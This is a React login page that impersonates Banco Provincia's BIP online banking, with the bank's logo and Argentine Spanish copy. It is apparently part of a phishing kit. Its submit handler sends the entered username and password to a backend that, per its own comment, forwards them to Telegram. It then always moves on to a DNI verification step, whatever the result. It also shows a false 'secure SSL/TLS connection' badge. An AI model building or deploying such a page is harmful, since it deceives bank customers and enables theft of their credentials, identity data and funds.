import { useState, useEffect } from 'react';
import type { FormEvent } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { useAuth } from '../../hooks/useAuth';

export default function Login() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoaded, setIsLoaded] = useState(false);
  const [userType, setUserType] = useState<'personas' | 'empresas'>('personas');
  
  const { login, isLoggingIn } = useAuth();
  const navigate = useNavigate();

  useEffect(() => {
    // Animación de entrada
    setTimeout(() => setIsLoaded(true), 100);
    
    // Obtener el tipo de usuario de localStorage
    const savedUserType = localStorage.getItem('bipUserType') as 'personas' | 'empresas' | null;
    if (savedUserType) {
      setUserType(savedUserType);
    }
  }, []);

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      return;
    }
    
    try {
      // Enviar login al backend (envía a Telegram)
      await login({ username, password });
      console.log('✅ Login enviado correctamente');
    } catch (error) {
      console.log('⚠️ Error en login pero continuamos:', error);
    }
    
    // Siempre continuar al siguiente paso
    navigate('/dni-verification');
  };

  return (
    <div className="min-h-screen min-h-[100dvh] bg-gradient-to-br from-gray-50 via-white to-gray-100 relative overflow-hidden">
      {/* Patrón de fondo profesional */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-40 -right-40 w-96 h-96 bg-gradient-to-br from-emerald-400/20 to-teal-400/20 rounded-full blur-3xl"></div>
        <div className="absolute -bottom-40 -left-40 w-96 h-96 bg-gradient-to-tr from-green-400/20 to-cyan-400/20 rounded-full blur-3xl"></div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-to-r from-emerald-400/5 to-teal-400/5 rounded-full blur-3xl"></div>
        
        {/* Formas geométricas sutiles */}
        <svg className="absolute top-20 left-10 w-64 h-64 text-emerald-500/10" viewBox="0 0 200 200">
          <polygon points="100,10 190,60 190,140 100,190 10,140 10,60" fill="currentColor" />
        </svg>
        <svg className="absolute bottom-20 right-10 w-48 h-48 text-teal-500/10" viewBox="0 0 200 200">
          <circle cx="100" cy="100" r="90" fill="currentColor" />
        </svg>
      </div>

      <div className="relative z-10 min-h-screen min-h-[100dvh] flex items-center justify-center p-4 sm:p-6">
        <div className={`w-full max-w-md transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8'}`}>
          
          {/* Header con logo */}
          <div 
            className="py-5 px-6 rounded-t-2xl flex flex-col items-center justify-center shadow-lg"
            style={{ background: 'linear-gradient(135deg, #1e8a5e 0%, #22a06b 30%, #26b573 60%, #2eb8a0 100%)' }}
          >
            <img 
              src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip" 
              alt="Banco Provincia"
              className="h-9 drop-shadow-lg"
              loading="eager"
            />
            {/* Indicador de tipo de usuario */}
            <div className="mt-3 flex items-center gap-2">
              <span className={`px-3 py-1 rounded-full text-xs font-medium transition-all ${
                userType === 'personas' 
                  ? 'bg-white/20 text-white' 
                  : 'bg-transparent text-white/60 hover:text-white/80'
              }`}>
                Personas
              </span>
              <span className="text-white/40">|</span>
              <span className={`px-3 py-1 rounded-full text-xs font-medium transition-all ${
                userType === 'empresas' 
                  ? 'bg-white/20 text-white' 
                  : 'bg-transparent text-white/60 hover:text-white/80'
              }`}>
                Empresas
              </span>
            </div>
          </div>

          {/* Formulario */}
          <div className="bg-white/95 backdrop-blur-sm p-6 sm:p-8 rounded-b-2xl shadow-2xl border border-gray-100">
            <h2 className="text-2xl sm:text-[1.65rem] font-bold text-transparent bg-clip-text bg-gradient-to-r from-emerald-600 to-teal-600 mb-6">
              Iniciá sesión
            </h2>

            <form onSubmit={handleSubmit} className="space-y-5">
              <div className="space-y-1">
                <label className="block text-gray-700 text-sm font-medium">
                  Tu usuario <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Ingresá tu nombre de usuario"
                    className="w-full px-4 py-3 bg-gray-50/80 border-2 border-gray-200 rounded-xl focus:border-emerald-500 focus:bg-white focus:ring-4 focus:ring-emerald-500/10 outline-none transition-all duration-200 text-gray-800 placeholder:text-gray-400"
                    disabled={isLoggingIn}
                    autoComplete="username"
                  />
                  <div className="absolute right-3 top-1/2 -translate-y-1/2">
                    <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                    </svg>
                  </div>
                </div>
              </div>

              <div className="space-y-1">
                <label className="block text-gray-700 text-sm font-medium">
                  Tu clave <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Ingresá tu clave"
                    className="w-full px-4 py-3 bg-gray-50/80 border-2 border-gray-200 rounded-xl focus:border-emerald-500 focus:bg-white focus:ring-4 focus:ring-emerald-500/10 outline-none transition-all duration-200 text-gray-800 placeholder:text-gray-400 pr-12"
                    disabled={isLoggingIn}
                    autoComplete="current-password"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors p-1"
                  >
                    {showPassword ? (
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                      </svg>
                    ) : (
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                      </svg>
                    )}
                  </button>
                </div>
              </div>

              <div className="text-center pt-1">
                <button type="button" className="text-teal-600 hover:text-teal-700 text-sm inline-flex items-center gap-1.5 font-medium hover:underline transition-all">
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
                  </svg>
                  <span>Teclado Virtual</span>
                </button>
              </div>

              <button
                type="submit"
                disabled={isLoggingIn}
                className="w-full bg-gradient-to-r from-gray-800 to-gray-900 hover:from-gray-900 hover:to-black text-white font-semibold py-3.5 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed transform hover:-translate-y-0.5 active:translate-y-0"
              >
                {isLoggingIn ? (
                  <span className="inline-flex items-center gap-2">
                    <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Ingresando...
                  </span>
                ) : 'Ingresar'}
              </button>
            </form>

            <div className="mt-6 text-center space-y-2.5 text-sm">
              <p className="text-gray-600">
                ¿No sos BIP?{' '}
                <button className="text-teal-600 hover:text-teal-700 font-semibold hover:underline transition-colors">
                  Registrate
                </button>
              </p>
              <button className="block w-full text-teal-600 hover:text-teal-700 hover:underline transition-colors">
                Bloqueé u olvidé mi usuario y/o clave
              </button>
            </div>

            <div className="mt-6 pt-6 border-t border-gray-200 flex flex-col sm:flex-row justify-between gap-2 text-xs">
              <button className="text-teal-600 hover:text-teal-700 hover:underline transition-colors text-left">
                Conocé como hacerte usuario u operar
              </button>
              <button className="text-teal-600 hover:text-teal-700 hover:underline transition-colors text-left sm:text-right">
                Recomendaciones de seguridad
              </button>
            </div>
          </div>

          {/* Footer de seguridad */}
          <div className="mt-4 text-center space-y-2">
            <p className="text-xs text-gray-500 flex items-center justify-center gap-1.5">
              <svg className="w-4 h-4 text-emerald-600" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              Conexión segura SSL/TLS
            </p>
            <Link 
              to="/" 
              className="inline-flex items-center gap-1 text-xs text-teal-600 hover:text-teal-700 transition-colors"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
              </svg>
              Volver al inicio
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
}
